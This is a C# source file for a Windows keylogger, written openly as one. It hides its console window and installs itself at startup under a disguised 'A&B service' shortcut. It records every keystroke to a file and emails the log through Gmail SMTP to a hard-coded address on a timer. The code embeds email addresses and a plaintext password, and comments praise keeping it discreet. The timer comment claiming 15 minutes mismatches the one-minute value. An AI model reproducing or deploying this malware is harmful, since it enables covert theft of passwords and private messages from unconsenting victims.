using System;
using System.Threading;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.IO;
using System.Net.Mail;
using IWshRuntimeLibrary;

namespace Keylogger
{
    class Program
    {
        /*
                => This code was written By ELMASSAOUDI YASSINE
                => please make sure to give me credit if you decide to use this code
                => I don't encourage you to use it illegally and I don't take responsibility for your actions
                Please be aware that using this on people without permission is illegal 
        */

        //Timer For mailing
        private static System.Timers.Timer timer;

        //Getting Async key states Function
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int Key);

        //Retrieving the window handle used by the console associated with the calling process
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        //Setting the specified window's show state
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); //if nCmdShow == 0 it will hide the window and if nCmdShow == 5 it will display it

        //defining the above values
        const int SW_HIDE = 0; 
        const int SW_SHOW = 5;

        //setting up the file path to use
        const string PATH = "Log.txt";
        static string sr;

        //Setting up Application to launch at startup
        static string Startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup); //Startup folder
        static bool willLaunchAtStartup = false;
        private static void SetUpStartUp() //Startup function
        {
            WshShell shell = new WshShell();
            string shortcutAddress = Startup + @"\ABservice.lnk";
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutAddress);
            shortcut.Description = "A&B service";
            shortcut.TargetPath = Environment.CurrentDirectory + @"\ABService.exe";
            shortcut.Save();//adding a shortcut in the current users startup folder
            willLaunchAtStartup = true;
        }

        static void Main(string[] args)
        {
            //Hiding the console window
            //this also hides it from the task manager
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            //Setting up application to launch at startup
            if (!willLaunchAtStartup)
                SetUpStartUp();

            //Will be used for the Output of the GetAsyncKeyState function
            short Key;

            //configuring the timer
            timer = new System.Timers.Timer(60000); //that's the quivalent of 15 minutes in milliseconds
            timer.Elapsed += OnTimedEvent; //trigger the event every 15 minutes
            timer.AutoReset = true; //reset the timer every 15 minutes
            timer.Enabled = true;

            //the string that will saved to the file
            string OUTPUT = string.Empty;

            //the Main loop
            while (true)
            {
                for (int i = 0; i < 255; i++) //cheking all virtual key code from 0x01 to 0xFE
                {
                    Key = GetAsyncKeyState(i); //the function returns a short (int16) and If the most significant bit is set, the key is down, and if the least significant bit is set or just -32767
                    if (Key == short.MinValue + 1) //if the key was pressed format that shit a little and add it to the output string
                    {
                        Keys K = (Keys)i;
                        if(K.ToString() == "Space")
                            OUTPUT += " ";
                        else if(K.ToString() == "Return")
                            OUTPUT += "\n";
                        else
                            OUTPUT += K.ToString();
                    }
                }
                using(StreamWriter sw = System.IO.File.AppendText(PATH))
                {
                    //writing the output string to the file
                    sw.WriteAsync(OUTPUT); 
                }
                //because we are using an infinite loop this will help with CPU usage... you want it to be discreet right?
                Thread.Sleep(20);
                sr += OUTPUT; //this will be sent in mail
                OUTPUT = string.Empty;
            }
        }

        //setting up the function that sends emails
        public static void email_send()
        {
            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
            mail.From = new MailAddress("yassine.160.hh@gmail.com"); //your email adress
            mail.To.Add("massaoudi.yass@gmail.com"); //the recieving adress
            
            //these are just what they sound like
            mail.Subject = "Keylogger Log";
            string body = string.Format(DateTime.Now.ToLongTimeString() + "\n\n\n"+ sr.ToString());
            mail.Body = body;

            SmtpServer.Port = 587;
            SmtpServer.Credentials = new System.Net.NetworkCredential("yassine.160.hh@gmail.com", "password12345");//gmail login and password
            SmtpServer.EnableSsl = true;

            SmtpServer.Send(mail);
            sr = string.Empty; //Memory Freedom
        }

        //this event is triggered every 15 minutes... change timer value to change it
        private static void OnTimedEvent(Object source, System.Timers.ElapsedEventArgs e)
        {
            email_send(); //well send the file every 15 minutes
        }
    }
}
